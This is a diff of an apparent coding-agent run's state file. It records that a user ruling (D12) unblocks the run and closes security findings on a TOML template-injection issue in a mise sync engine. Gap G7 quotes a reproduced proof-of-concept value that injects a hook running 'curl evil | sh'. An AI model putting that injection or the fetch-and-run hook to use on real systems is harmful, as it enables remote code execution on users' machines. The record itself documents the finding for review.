@@ -10,8 +10,8 @@
   "backlog_pieces": [],
   "gaps_of": [],
   "status": {
-    "state": "BLOCKED",
-    "detail": "BLOCKED at wave 3 — U3 UNRESOLVED: security findings did not converge (1 then 2, G7); rule in D6 whether a rendered value must also leave every fixed value unchanged and be checked with the generator's parser, or whether the values file is trusted and the key-path check stands (G8); U4, U5 skipped (depend on U3); worktree /Users/virajpatel/Projects/github.com/virajp/bootstrap/.claude/worktrees/bootstrap-2-0-3ae4b9"
+    "state": "RUNNING",
+    "detail": "RUNNING since 2026-11-05T04:24:08Z in /Users/virajpatel/Projects/github.com/virajp/bootstrap/.claude/worktrees/bootstrap-2-0-3ae4b9"
   },
   "consent": {
     "merge": true,
@@ -105,9 +105,9 @@
         "U2"
       ],
       "waits": "",
-      "status": "unresolved",
+      "status": "green",
       "started": "2026-11-04T19:51:56.795Z",
-      "ended": "2026-11-04T20:25:43.240Z",
+      "ended": "2026-11-05T04:24:43.678Z",
       "commit": "",
       "rounds": 2,
       "range": {
@@ -134,7 +134,7 @@
         "U3"
       ],
       "waits": "",
-      "status": "skipped",
+      "status": "pending",
       "started": "",
       "ended": "2026-11-04T20:25:43.308Z",
       "commit": "",
@@ -152,7 +152,7 @@
         "U4"
       ],
       "waits": "",
-      "status": "skipped",
+      "status": "pending",
       "started": "",
       "ended": "2026-11-04T20:25:43.375Z",
       "commit": "",
@@ -174,9 +174,9 @@
     },
     {
       "id": "W3",
-      "status": "failed",
+      "status": "green",
       "started": "2026-11-04T19:51:56.759Z",
-      "ended": "2026-11-04T20:25:43.439Z"
+      "ended": "2026-11-05T04:33:40.360Z"
     },
     {
       "id": "W4",
@@ -305,6 +305,16 @@
         "U1",
         "U2"
       ]
+    },
+    {
+      "id": "D12",
+      "decision": "Must a rendered value leave every fixed value of a tools.toml unchanged, and must the check use the parser of the generator (G7, G8)?",
+      "ruling": "User ruling 2026-11-05: trust the values file. The check that the rendered copy has the same key paths as the raw tools.toml (78669ea) stands. A rendered value that replaces a fixed value with equal key paths, and a key that yq and gomplate read differently, are not defects, because a writer of the values file can already add mise config directly. A security review does not report these two cases again.",
+      "rejected": "Require that each fixed value stays unchanged, and do the check with the parser of the generator: it adds engine code and tests and gives no real protection.",
+      "units": [
+        "U1",
+        "U3"
+      ]
     }
   ],
   "stages": {
@@ -359,8 +369,8 @@
       "id": "G4",
       "unit": "U3",
       "stage": "security",
-      "text": "D6 and U1 treat a value that breaks TOML only as a parse failure; they do not require a rendered value to stay inside its string · the run took the check that the rendered copy has the same key paths as the raw tools.toml, code 2 on a difference",
-      "state": "open"
+      "text": "D6 and U1 treat a value that breaks TOML only as a parse failure; they do not require a rendered value to stay inside its string · the run took the check that the rendered copy has the same key paths as the raw tools.toml, code 2 on a difference · closed: D12 rules that the key-path check stands, which is the assumption taken",
+      "state": "closed"
     },
     {
       "id": "G5",
@@ -380,15 +390,15 @@
       "id": "G7",
       "unit": "U3",
       "stage": "security",
-      "text": "Non-converging security findings at U3: round 1 had 1 finding (rendered value adds TOML tables, low), fixed by the key-path compare in 78669ea; round 2 has 2, so the guard tripped and security findings cannot become gaps. Round 2: [medium] sync-engine/mise:455, the finding is not resolved, a value can replace a fixed value (two expressions, the first redefines the keys and opens a multi-line string that swallows the raw lines up to the second, key paths stay equal; reproduced rc=0 on macos with a=x\"\\n[mise.hooks]\\nenter = \"curl evil | sh\"\\n[mise.bootstrap.user]\\nlogin_shell = \"\"\" and b=\"\"\"\\n#). [low] sync-engine/mise:446, the check parses with yq and the generator with gomplate, they disagree on the key <<, so a value can add keys under that name · no assumption taken; the run paused. Both need write access to the values file, which can already add mise config directly, and no shipped tools.toml holds <% yet",
-      "state": "open"
+      "text": "Non-converging security findings at U3: round 1 had 1 finding (rendered value adds TOML tables, low), fixed by the key-path compare in 78669ea; round 2 has 2, so the guard tripped and security findings cannot become gaps. Round 2: [medium] sync-engine/mise:455, the finding is not resolved, a value can replace a fixed value (two expressions, the first redefines the keys and opens a multi-line string that swallows the raw lines up to the second, key paths stay equal; reproduced rc=0 on macos with a=x\"\\n[mise.hooks]\\nenter = \"curl evil | sh\"\\n[mise.bootstrap.user]\\nlogin_shell = \"\"\" and b=\"\"\"\\n#). [low] sync-engine/mise:446, the check parses with yq and the generator with gomplate, they disagree on the key <<, so a value can add keys under that name · no assumption taken; the run paused. Both need write access to the values file, which can already add mise config directly, and no shipped tools.toml holds <% yet · closed: the user ruled D12 on 2026-11-05: both round 2 findings are not defects",
+      "state": "closed"
     },
     {
       "id": "G8",
       "unit": "U3",
       "stage": "security",
-      "text": "D6 and 01-engine.md never require that a rendered value leaves every fixed value unchanged, or that the check uses the generator's TOML parser · no assumption taken; this is the ruling the run stopped for",
-      "state": "open"
+      "text": "D6 and 01-engine.md never require that a rendered value leaves every fixed value unchanged, or that the check uses the generator's TOML parser · no assumption taken; this is the ruling the run stopped for · closed: the user ruled D12 on 2026-11-05: trust the values file, no fixed-value or same-parser requirement",
+      "state": "closed"
     },
     {
       "id": "G9",
